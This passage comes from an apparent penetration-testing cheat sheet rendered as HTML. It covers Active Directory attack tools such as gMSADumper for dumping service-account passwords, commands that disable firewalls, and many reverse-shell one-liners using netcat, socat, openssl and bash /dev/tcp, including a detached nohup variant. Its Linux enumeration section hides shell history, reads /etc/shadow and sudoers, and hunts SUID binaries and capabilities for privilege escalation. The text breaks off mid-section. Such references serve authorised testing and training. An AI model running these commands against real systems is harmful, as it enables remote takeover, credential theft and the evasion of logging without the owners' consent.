<span class="nb">seq </span>25 | xargs <span class="nt">-I</span><span class="o">{}</span> ./rot.py <span class="s2">"&lt;str&gt;"</span> <span class="o">{}</span></code></pre></div></div></li> </ul> <h3 id="encryption--tools--balbuzard"> <a href="#encryption--tools--balbuzard" class="anchor-heading" aria-labelledby="encryption--tools--balbuzard"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> balbuzard </h3> <ul> <li><a href="https://github.com/decalage2/balbuzard">Site</a> - Extract and Crack encryption<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Extracts</span>
bbharvest &lt;file&gt;

<span class="c"># Cracks</span>
bbcrack &lt;file&gt;</code></pre></div></div></li> </ul> <h1 id="active-directory"> <a href="#active-directory" class="anchor-heading" aria-labelledby="active-directory"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Active Directory </h1> <h2 id="active-directory--addspn-py"> <a href="#active-directory--addspn-py" class="anchor-heading" aria-labelledby="active-directory--addspn-py"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> addspn.py </h2> <ul> <li><a href="https://github.com/dirkjanm/krbrelayx">Site</a> - SPNs Ops on AD accounts over LDAP<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Add SPN to &lt;target&gt; in &lt;ip/host&gt;</span>
addspn.py <span class="nt">-u</span> &lt;usr&gt; <span class="nt">-p</span> &lt;pass&gt; <span class="nt">-t</span> &lt;target-name&gt; <span class="nt">-s</span> &lt;SPN&gt; &lt;ip/host&gt;
<span class="c"># -a  - Use msDS-AdditionalDnsHostName</span>
<span class="c"># -r  - Remove</span>
<span class="c"># -q  - Show &lt;target&gt; SPNs</span></code></pre></div></div></li> </ul> <h2 id="active-directory--dnstool-py"> <a href="#active-directory--dnstool-py" class="anchor-heading" aria-labelledby="active-directory--dnstool-py"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> dnstool.py </h2> <ul> <li><a href="https://github.com/dirkjanm/krbrelayx">Site</a> - DNS Ops on ADIDNS rec over LDAP<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Add DNS record fqdn+ip on &lt;ip/host&gt;</span>
dnstool.py <span class="nt">-u</span> <span class="s2">"&lt;dom&gt;</span><span class="se">\&lt;</span><span class="s2">usr&gt;"</span> <span class="nt">-p</span> &lt;pass&gt; <span class="nt">-a</span> add <span class="nt">-r</span> &lt;target-rec/fqdn&gt; <span class="nt">-d</span> &lt;data-rec/ip&gt; &lt;ip/host&gt;
<span class="c"># -a query      - Query records</span>
<span class="c"># --print-zones - Query zones</span>
<span class="c"># --zone &lt;zone&gt; - Zone to search in</span>
<span class="c"># --forest      - Look ForestDnsZones</span>
<span class="c"># See other -a options</span></code></pre></div></div></li> </ul> <h2 id="active-directory--gmsadumper"> <a href="#active-directory--gmsadumper" class="anchor-heading" aria-labelledby="active-directory--gmsadumper"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> gMSADumper </h2> <ul> <li><a href="https://github.com/micahvandeusen/gMSADumper">Site</a> - Dump service account pass (GMSA):<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gMSADumper.py <span class="nt">-u</span> &lt;user&gt; <span class="nt">-p</span> &lt;pass&gt; <span class="nt">-d</span> &lt;dom&gt;
<span class="c"># -p &lt;lm:ntlm&gt;  - Pass the Hash auth</span>
<span class="c"># -l &lt;dom.ctrl&gt; - For Pass the Hash</span>
<span class="c"># -k            - Kerberos auth (+ -l)</span></code></pre></div></div></li> </ul> <h1 id="firewall"> <a href="#firewall" class="anchor-heading" aria-labelledby="firewall"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Firewall </h1> <h2 id="firewall--centos"> <a href="#firewall--centos" class="anchor-heading" aria-labelledby="firewall--centos"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> CentOS </h2> <h3 id="firewall--centos--firewalld"> <a href="#firewall--centos--firewalld" class="anchor-heading" aria-labelledby="firewall--centos--firewalld"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> firewalld </h3> <ul> <li>Disable firewall:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>systemctl stop firewalld</code></pre></div></div></li> <li>Check rules (<a href="https://www.tecmint.com/firewalld-rules-for-centos-7/">ref</a>):<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># List all rules</span>
firewall-cmd <span class="nt">--list-all</span>

<span class="c"># List rule-groups</span>
firewall-cmd <span class="nt">--get-active-zones</span>
firewall-cmd <span class="nt">--get-services</span>

<span class="c"># List rule group content</span>
firewall-cmd <span class="nt">--zone</span><span class="o">=</span>&lt;rule&gt; <span class="nt">--list-all</span>
firewall-cmd <span class="nt">--zone</span><span class="o">=</span>&lt;rule&gt; <span class="nt">--list-ports</span></code></pre></div></div></li> </ul> <h2 id="firewall--windows"> <a href="#firewall--windows" class="anchor-heading" aria-labelledby="firewall--windows"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Windows </h2> <ul> <li>Disable firewall:<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">netsh</span> <span class="kd">firewall</span> <span class="kd">set</span> <span class="kd">opmode</span> <span class="na">disable</span></code></pre></div></div></li> <li>Allow ports by services:<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">:: RDP access</span>
<span class="nb">netsh</span> <span class="kd">firewall</span> <span class="kd">set</span> <span class="kd">service</span> <span class="kd">remoteadmin</span> <span class="kd">enable</span>

<span class="nb">netsh</span> <span class="kd">firewall</span> <span class="kd">set</span> <span class="kd">service</span> <span class="kd">remotedesktop</span> <span class="kd">enable</span></code></pre></div></div></li> <li>Allow ports by number:<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">ufw</span> <span class="kd">allow</span> <span class="kd">from</span> <span class="o">&lt;</span><span class="kd">ip</span><span class="o">&gt;</span> <span class="kd">proto</span> <span class="kd">tcp</span> <span class="kd">to</span> <span class="kd">any</span> <span class="kd">port</span> <span class="o">&lt;</span><span class="kd">port1</span><span class="o">&gt;,&lt;</span><span class="kd">port2</span><span class="o">&gt;</span>...</code></pre></div></div></li> </ul> <h1 id="reverse-bind-shells---tty"> <a href="#reverse-bind-shells---tty" class="anchor-heading" aria-labelledby="reverse-bind-shells---tty"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Reverse/Bind shells + TTY </h1> <h2 id="reverse-bind-shells---tty--linux"> <a href="#reverse-bind-shells---tty--linux" class="anchor-heading" aria-labelledby="reverse-bind-shells---tty--linux"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Linux </h2> <h3 id="reverse-bind-shells---tty--linux--shells"> <a href="#reverse-bind-shells---tty--linux--shells" class="anchor-heading" aria-labelledby="reverse-bind-shells---tty--linux--shells"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Shells </h3> <h4 id="reverse-bind-shells---tty--linux--shells--netcat-traditional-ncat"> <a href="#reverse-bind-shells---tty--linux--shells--netcat-traditional-ncat" class="anchor-heading" aria-labelledby="reverse-bind-shells---tty--linux--shells--netcat-traditional-ncat"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Netcat Traditional/Ncat </h4> <ul> <li>Basic:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Use -u for UDP</span>
nc <span class="nt">-n</span> &lt;ip&gt; &lt;port&gt; <span class="nt">-e</span> /bin/sh

ncat <span class="nt">-n</span> &lt;ip&gt; &lt;port&gt; <span class="nt">-e</span> /bin/sh
<span class="c"># Or -c bash instead of -e</span></code></pre></div></div></li> </ul> <h4 id="reverse-bind-shells---tty--linux--shells--netcat-openbsd"> <a href="#reverse-bind-shells---tty--linux--shells--netcat-openbsd" class="anchor-heading" aria-labelledby="reverse-bind-shells---tty--linux--shells--netcat-openbsd"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Netcat OpenBSD </h4> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">rm</span> <span class="nt">-f</span> /tmp/f<span class="p">;</span> <span class="nb">mkfifo</span> /tmp/f<span class="p">;</span> /bin/sh <span class="nt">-i</span> &lt; /tmp/f 2&gt;&amp;1 | nc <span class="nt">-n</span> &lt;ip&gt; &lt;port&gt; <span class="o">&gt;</span> /tmp/f</code></pre></div></div> <h4 id="reverse-bind-shells---tty--linux--shells--netcat-busybox"> <a href="#reverse-bind-shells---tty--linux--shells--netcat-busybox" class="anchor-heading" aria-labelledby="reverse-bind-shells---tty--linux--shells--netcat-busybox"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Netcat Busybox </h4> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">rm</span> <span class="nt">-f</span> /tmp/f<span class="p">;</span> <span class="nb">mknod</span> /tmp/f p<span class="p">;</span> /bin/sh <span class="nt">-i</span> &lt; /tmp/f 2&gt;&amp;1 | nc <span class="nt">-n</span> &lt;ip&gt; &lt;port&gt; <span class="o">&gt;</span> /tmp/f</code></pre></div></div> <h4 id="reverse-bind-shells---tty--linux--shells--socat"> <a href="#reverse-bind-shells---tty--linux--shells--socat" class="anchor-heading" aria-labelledby="reverse-bind-shells---tty--linux--shells--socat"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Socat </h4> <ul> <li>Client:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>socat EXEC:<span class="s1">'bash -i'</span>,stderr TCP:&lt;ip&gt;:&lt;port&gt;</code></pre></div></div></li> <li>Client PTY:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>socat EXEC:<span class="s1">'bash -i'</span>,pty,ctty,stderr,setsid,sigint,sane TCP:&lt;ip&gt;:&lt;port&gt;</code></pre></div></div></li> <li>Server PTY:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Use - instead of $(tty)</span>
socat GOPEN:<span class="si">$(</span><span class="nb">tty</span><span class="si">)</span>,raw,echo<span class="o">=</span>0 TCP-LISTEN:&lt;port&gt;</code></pre></div></div></li> </ul> <h4 id="reverse-bind-shells---tty--linux--shells--openssl"> <a href="#reverse-bind-shells---tty--linux--shells--openssl" class="anchor-heading" aria-labelledby="reverse-bind-shells---tty--linux--shells--openssl"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> OpenSSL </h4> <ul> <li>Client:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">rm</span> <span class="nt">-f</span> /tmp/s<span class="p">;</span> <span class="nb">mkfifo</span> /tmp/s<span class="p">;</span> /bin/sh <span class="nt">-i</span> &lt; /tmp/s 2&gt;&amp;1 | openssl s_client <span class="nt">-quiet</span> <span class="nt">-connect</span> &lt;ip&gt;:&lt;port&gt; <span class="o">&gt;</span> /tmp/s</code></pre></div></div></li> <li>Server:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Generate the certificate</span>
openssl req <span class="nt">-x509</span> <span class="nt">-newkey</span> rsa:4096 <span class="nt">-keyout</span> key.pem <span class="nt">-out</span> cert.pem <span class="nt">-days</span> 365 <span class="nt">-nodes</span>

<span class="c"># Start the server</span>
openssl s_server <span class="nt">-quiet</span> <span class="nt">-key</span> key.pem <span class="nt">-cert</span> cert.pem <span class="nt">-port</span> &lt;port&gt;

<span class="c"># Use ncat as alternative</span>
ncat <span class="nt">--ssl</span> <span class="nt">-lnvp</span> &lt;port&gt;</code></pre></div></div></li> </ul> <h4 id="reverse-bind-shells---tty--linux--shells--bash"> <a href="#reverse-bind-shells---tty--linux--shells--bash" class="anchor-heading" aria-labelledby="reverse-bind-shells---tty--linux--shells--bash"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Bash </h4> <ul> <li>Obtain a reverse-shell using bash:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># UDP is also an option</span>
bash <span class="nt">-i</span> &amp;&gt;/dev/tcp/&lt;ip&gt;/8080 0&gt;&amp;1</code></pre></div></div></li> <li>Detach it from the current process:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">nohup </span>bash <span class="nt">-c</span> <span class="s1">'setsid bash -i &amp;&gt;/dev/tcp/&lt;ip&gt;/8080 0&gt;&amp;1 &amp;'</span> <span class="o">&gt;</span>/dev/null 2&gt;&amp;1 &amp;
<span class="c"># It may not work over webapps</span></code></pre></div></div></li> </ul> <h3 id="reverse-bind-shells---tty--linux--tty-pty-upgrade"> <a href="#reverse-bind-shells---tty--linux--tty-pty-upgrade" class="anchor-heading" aria-labelledby="reverse-bind-shells---tty--linux--tty-pty-upgrade"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> TTY/PTY Upgrade </h3> <h4 id="reverse-bind-shells---tty--linux--tty-pty-upgrade--script"> <a href="#reverse-bind-shells---tty--linux--tty-pty-upgrade--script" class="anchor-heading" aria-labelledby="reverse-bind-shells---tty--linux--tty-pty-upgrade--script"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Script </h4> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">exec</span> /usr/bin/script <span class="nt">-qc</span> /bin/bash /dev/null</code></pre></div></div> <h4 id="reverse-bind-shells---tty--linux--tty-pty-upgrade--python"> <a href="#reverse-bind-shells---tty--linux--tty-pty-upgrade--python" class="anchor-heading" aria-labelledby="reverse-bind-shells---tty--linux--tty-pty-upgrade--python"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Python </h4> <ul> <li>Using PTY:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">exec </span>python <span class="nt">-c</span> <span class="s2">"import pty; pty.spawn('/bin/sh')"</span></code></pre></div></div></li> <li>Using Subprocess:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">exec </span>python <span class="nt">-c</span> <span class="s2">"__import__('subprocess').call(['/bin/bash'])"</span></code></pre></div></div></li> </ul> <h4 id="reverse-bind-shells---tty--linux--tty-pty-upgrade--perl"> <a href="#reverse-bind-shells---tty--linux--tty-pty-upgrade--perl" class="anchor-heading" aria-labelledby="reverse-bind-shells---tty--linux--tty-pty-upgrade--perl"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Perl </h4> <ul> <li>Using exec:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">exec </span>perl <span class="nt">-e</span> <span class="s2">"exec '/bin/sh';"</span></code></pre></div></div></li> <li>Using backquotes:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">exec </span>perl <span class="nt">-e</span> <span class="s2">"print </span><span class="sb">`</span>/bin/sh<span class="sb">`</span><span class="s2">;"</span></code></pre></div></div></li> </ul> <h4 id="reverse-bind-shells---tty--linux--tty-pty-upgrade--socat"> <a href="#reverse-bind-shells---tty--linux--tty-pty-upgrade--socat" class="anchor-heading" aria-labelledby="reverse-bind-shells---tty--linux--tty-pty-upgrade--socat"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Socat </h4> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>socat EXEC:<span class="s2">"/bin/sh -i"</span>,pty,ctty,stderr,setsid,sigint,sane -</code></pre></div></div> <h3 id="reverse-bind-shells---tty--linux--full-interactivity"> <a href="#reverse-bind-shells---tty--linux--full-interactivity" class="anchor-heading" aria-labelledby="reverse-bind-shells---tty--linux--full-interactivity"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Full Interactivity </h3> <ul> <li>Check that the system can be upgraded:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># stty needs to be available</span>
<span class="nb">type stty</span>

<span class="c"># Or resize</span>
<span class="nb">type </span>resize

<span class="c"># It may be hidden</span>
find / <span class="nt">-name</span> resize<span class="se">\*</span> <span class="nt">-type</span> f 2&gt;/dev/null

<span class="c"># Or check whether $ROWS and $COLUMNS</span>
<span class="c"># are used:</span>
<span class="nb">export
set</span>

<span class="c"># Very recommended to be available</span>
<span class="nb">type </span>reset</code></pre></div></div></li> <li>Background the shell with <code>Ctrl-Z</code></li> <li>Obtain the size of the current terminal<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># The numbers are ROWS COLUMNS</span>
<span class="nb">stty </span>size

<span class="c"># POSIX alternative</span>
<span class="nb">stty</span> <span class="nt">-a</span> | <span class="nb">sed</span> <span class="nt">-n</span> <span class="s1">'s/.*\(\(\(rows\|columns\)[^;]*; \)\{2\}\).*/\1/p'</span>

<span class="c"># With tput</span>
<span class="nb">echo</span> <span class="s1">'lines\ncols'</span> | tput <span class="nt">-S</span></code></pre></div></div></li> <li>Enable RAW mode + foreground the shell:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span> <span class="nb">fg</span></code></pre></div></div></li> <li>Introduce the following blindly:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Set the terminal type</span>
<span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm-256color
<span class="c"># Fallbacks:</span>
<span class="c">#   xterm, screen, linux, or dumb</span>

<span class="c"># Sustitute with the previous values</span>
<span class="nb">stty </span>rows &lt;rows&gt; cols &lt;cols&gt;

<span class="c"># Or, if resize is available</span>
<span class="nb">export </span><span class="nv">ROWS</span><span class="o">=</span>&lt;rows&gt;
<span class="nb">export </span><span class="nv">COLUMNS</span><span class="o">=</span>&lt;cols&gt;
resize</code></pre></div></div></li> <li>Apply the new changes:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">exec</span> /bin/bash <span class="nt">-i</span>

reset</code></pre></div></div></li> <li>Final exports:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">export </span><span class="nv">SHELL</span><span class="o">=</span>/bin/bash
<span class="nb">export </span><span class="nv">HOME</span><span class="o">=</span>/tmp
<span class="nb">export </span><span class="nv">PAGER</span><span class="o">=</span>less</code></pre></div></div></li> </ul> <h2 id="reverse-bind-shells---tty--windows"> <a href="#reverse-bind-shells---tty--windows" class="anchor-heading" aria-labelledby="reverse-bind-shells---tty--windows"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Windows </h2> <h3 id="reverse-bind-shells---tty--windows--shells"> <a href="#reverse-bind-shells---tty--windows--shells" class="anchor-heading" aria-labelledby="reverse-bind-shells---tty--windows--shells"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Shells </h3> <h4 id="reverse-bind-shells---tty--windows--shells--netcat-traditional-ncat"> <a href="#reverse-bind-shells---tty--windows--shells--netcat-traditional-ncat" class="anchor-heading" aria-labelledby="reverse-bind-shells---tty--windows--shells--netcat-traditional-ncat"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Netcat Traditional/Ncat </h4> <ul> <li><a href="https://eternallybored.org/misc/netcat/">netcat</a></li> <li><a href="https://nmap.org/dist/ncat-portable-5.59BETA1.zip">ncat-portable-5.59BETA1</a></li> <li>Note that non-interactive sessions will require <code>cmd.exe</code>:<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cmd.exe</span> <span class="na">/c </span><span class="kd">nc</span><span class="err">.exe</span> <span class="o">&lt;</span><span class="kd">ip</span><span class="o">&gt;</span> <span class="o">&lt;</span><span class="kd">port</span><span class="o">&gt;</span> <span class="na">-e </span><span class="nb">cmd</span></code></pre></div></div></li> </ul> <h1 id="system-enumeration"> <a href="#system-enumeration" class="anchor-heading" aria-labelledby="system-enumeration"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> System Enumeration </h1> <h2 id="system-enumeration--linux"> <a href="#system-enumeration--linux" class="anchor-heading" aria-labelledby="system-enumeration--linux"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Linux </h2> <ul> <li>Prevent command logging:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Bash</span>
<span class="nb">echo</span> <span class="nv">$HISTFILE</span>

<span class="nb">export </span><span class="nv">HISTFILE</span><span class="o">=</span>/dev/null

<span class="c"># Zsh</span>
<span class="c"># Also check HISTFILE</span>
<span class="nb">echo</span> <span class="nv">$HISTFILE</span>

<span class="c"># Push a new history stack</span>
<span class="nb">fc</span> <span class="nt">-p</span>

<span class="c"># Pop current history stack (deleting)</span>
<span class="nb">fc</span> <span class="nt">-P</span></code></pre></div></div></li> <li>List environment variables:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="nv">$USER</span>

<span class="nb">echo</span> <span class="nv">$HOME</span>

<span class="nb">echo</span> <span class="nv">$SHELL</span>

<span class="nb">echo</span> <span class="nv">$PWD</span>

<span class="nb">echo</span> <span class="nv">$PATH</span>

<span class="c"># all</span>
<span class="nb">export

set</span>

<span class="c"># Modify for all programs in shell</span>
<span class="nb">export </span><span class="nv">VAR</span><span class="o">=</span>&lt;value&gt;

<span class="c"># Make it permanent for current user</span>
<span class="nb">echo</span> <span class="s1">'export VAR=&lt;value&gt;'</span> <span class="o">&gt;&gt;</span> ~/.bashrc</code></pre></div></div></li> <li>Locate users that could be used for logging in:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Also check /etc/shadow</span>
<span class="nb">grep</span> <span class="nt">-v</span> <span class="s1">'nologin\|false'</span> /etc/passwd</code></pre></div></div></li> <li>User identification:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">whoami</span>

<span class="c"># User, Group, and Context ID</span>
<span class="nb">id</span> <span class="nt">-a</span>

<span class="c"># Logged users</span>
<span class="nb">who</span>

<span class="c"># Logged users - extra info</span>
<span class="nb">who</span> <span class="nt">-a</span>

<span class="c"># Logged users + stats + login process</span>
w</code></pre></div></div></li> <li>Permissions identification:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Check if sudo may be vulnerable</span>
<span class="nb">sudo</span> <span class="nt">-V</span>

<span class="c"># Commands that can be run with sudo</span>
<span class="c"># without password prompting</span>
<span class="nb">sudo</span> <span class="nt">-l</span>
<span class="c"># Also note: env_keep+=LD_PRELOAD</span>

<span class="c"># Same but for all users</span>
less /etc/sudoers

<span class="c"># Find files with the SUID flag:</span>
find / <span class="se">\(</span> <span class="nt">-perm</span> <span class="nt">-4000</span> <span class="nt">-o</span> <span class="nt">-perm</span> <span class="nt">-2000</span> <span class="se">\)</span> <span class="nt">-type</span> f <span class="nt">-ls</span> 2&gt;/dev/null
<span class="c"># See how to leverage them:</span>
<span class="c"># https://gtfobins.github.io</span>
<span class="c"># Use ldd to detect missing libraries</span>

<span class="c"># Find folders with the S[UG]ID flags:</span>
find / <span class="se">\(</span> <span class="nt">-perm</span> <span class="nt">-4000</span> <span class="nt">-o</span> <span class="nt">-perm</span> <span class="nt">-2000</span> <span class="se">\)</span> <span class="nt">-type</span> d <span class="nt">-ls</span> 2&gt;/dev/null
<span class="c"># New files on such directories obtain</span>
<span class="c"># the folder's S[UG]ID automatically</span>

<span class="c"># Find everything else:</span>
find / <span class="se">\(</span> <span class="nt">-perm</span> <span class="nt">-4000</span> <span class="nt">-o</span> <span class="nt">-perm</span> <span class="nt">-2000</span> <span class="se">\)</span> <span class="se">\!</span> <span class="nt">-type</span> f <span class="se">\!</span> <span class="nt">-type</span> d <span class="nt">-ls</span> 2&gt;/dev/null
<span class="c"># Everything writable and executable</span>
<span class="c"># can be injected with evil code</span>

<span class="c"># Locate binaries with capabilities</span>
getcap <span class="nt">-r</span> / 2&gt;/dev/null
<span class="c"># CAP_SETUID allows privesc: GTFObins</span>
<span class="c"># Caps are retained in subprocesses</span>

<span class="c"># Users with capabilities</span>
less /etc/security/capability.conf

<span class="c"># Sevices with capabilities</span>
<span class="nb">grep</span> <span class="nt">-r</span> <span class="s1">'AmbientCapabilities='</span> /etc/systemd
<span class="c"># Other interesting Caps for privesc:</span>
<span class="c"># - CAP_SYS_ADMIN</span>
<span class="c"># - CAP_SYS_PTRACE</span>
<span class="c"># - CAP_SYS_MODULE</span>
<span class="c"># - CAP_DAC_READ_SEARCH</span>
<span class="c"># - CAP_DAC_OVERRIDE</span>
<span class="c"># - CAP_CHOWN</span>
<span class="c"># - CAP_FORMER</span>
<span class="c"># - CAP_SETGID</span>
<span class="c"># - CAP_SETFCAP</span>
<span class="c"># - CAP_SETUID</span>
<span class="c"># Caps that may aid in privesc:</span>
<span class="c"># - CAP_KILL</span>
<span class="c"># - CAP_NET_BIND_SERVICE</span>
<span class="c"># - CAP_NET_RAW</span>
<span class="c"># - CAP_NET_ADMIN + CAP_NET_RAW</span>
<span class="c"># - CAP_LINUX_IMMUTABLE</span></code></pre></div></div></li> <li>List OS and version:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># All details</span>
<span class="nb">cat</span> /proc/version

<span class="c"># Kernel details</span>
<span class="nb">uname</span> <span class="nt">-a</span>

<span class="c"># Distro detail</span>
<span class="nb">cat</span> /etc/issue

<span class="nb">cat</span> /etc/<span class="k">*</span><span class="nt">-release</span>
<span class="c"># Check the Dirty COW section</span></code></pre></div></div></li> <li>Kernel hardening using <a href="https://github.com/slimm609/checksec.sh">checksec</a>:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./checksec <span class="nt">--kernel</span> 2&gt;/dev/null</code></pre></div></div></li> <li>List scheduled tasks:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Current user</span>
crontab <span class="nt">-l</span>
<span class="c"># Some systems may use cru</span>

<span class="c"># System scheduled tasks</span>
less /etc/crontab

<span class="c"># Systemd timers</span>
systemctl list-timers</code></pre></div></div></li> <li>Find files/directories:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ls</span> <span class="nt">-lah</span> /

<span class="nb">ls</span> <span class="nt">-lah</span> /root

<span class="nb">ls</span> <span class="nt">-lah</span> /home

<span class="nb">ls</span> <span class="nt">-lah</span> /var

<span class="nb">ls</span> <span class="nt">-lah</span> /var/spool

<span class="nb">ls</span> <span class="nt">-lah</span> /var/mail

<span class="nb">ls</span> <span class="nt">-lah</span> /var/spool/mail

<span class="nb">ls</span> <span class="nt">-lah</span> /etc/security

<span class="nb">ls</span> <span class="nt">-lah</span> /etc/init

<span class="nb">ls</span> <span class="nt">-lahd</span> /etc/init

<span class="nb">ls</span> <span class="nt">-lah</span> /etc/init.d

<span class="nb">ls</span> <span class="nt">-lahd</span> /etc/init.d

<span class="nb">ls</span> <span class="nt">-lah</span> /etc/rc.d

<span class="nb">ls</span> <span class="nt">-lahd</span> /etc/rc.d

<span class="nb">ls</span> <span class="nt">-lah</span> /etc/rc.d/init.d

<span class="nb">ls</span> <span class="nt">-lahd</span> /etc/rc.d/init.d

<span class="nb">ls</span> <span class="nt">-lah</span> /etc/systemd/system

<span class="nb">ls</span> <span class="nt">-lahd</span> /etc/systemd/system

find /var/log <span class="nt">-type</span> f 2&gt;/dev/null

find /var/cache <span class="nt">-type</span> f 2&gt;/dev/null

find /var/crash <span class="nt">-type</span> f 2&gt;/dev/null

<span class="c"># Exclude paths</span>
find /var/www <span class="se">\!</span> <span class="nt">-path</span> /var/www/error/<span class="se">\*</span> <span class="nt">-type</span> f 2&gt;/dev/null

<span class="c"># Files owned by specific users/groups</span>
find / <span class="se">\(</span> <span class="nt">-user</span> adm <span class="nt">-o</span> <span class="nt">-group</span> adm <span class="se">\)</span> <span class="nt">-ls</span> 2&gt;/dev/null | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s1">' /sys\| /proc'</span>

<span class="nb">ls</span> <span class="nt">-lah</span> /etc

<span class="nb">ls</span> <span class="nt">-lah</span> /usr/src

<span class="nb">ls</span> <span class="nt">-lah</span> /usr/local

<span class="nb">ls</span> <span class="nt">-lah</span> /opt

<span class="nb">ls</span> <span class="nt">-lah</span> /var/opt

<span class="c"># Show the commands of the processes</span>
find /proc <span class="nt">-name</span> cmdline <span class="nt">-exec</span> sh <span class="nt">-c</span> <span class="s1">'grep -qv "^ *$" {} &amp;&amp; { echo; echo {} | sed "h;s/./-/gp;H;x"; cat {}; echo; }'</span> <span class="se">\;</span> 2&gt;/dev/null

<span class="c"># All world writable files</span>
find / <span class="nt">-perm</span> <span class="nt">-o</span>+w <span class="nt">-type</span> f <span class="se">\!</span> <span class="nt">-path</span> /proc <span class="se">\!</span> <span class="nt">-path</span> /sys 2&gt;/dev/null

<span class="c"># Check if they are writable</span>
